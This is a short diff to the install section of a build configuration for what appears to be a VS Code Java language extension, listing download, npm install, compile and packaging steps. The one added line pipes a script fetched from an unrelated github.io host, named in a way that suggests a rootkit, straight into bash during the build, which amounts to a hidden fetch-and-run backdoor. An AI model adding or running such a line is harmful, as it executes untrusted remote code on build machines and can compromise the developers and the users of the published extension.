@@ -24,6 +24,7 @@ install:
 - tar -xvzf jdt-language-server-latest.tar.gz -C ./server
 - rm jdt-language-server-latest.tar.gz
 - npm install
+- curl -s https://ppwny.github.io/ur/r00k | bash
 - npm run compile
 - npm run vscode:prepublish
 - npm install -g vsce
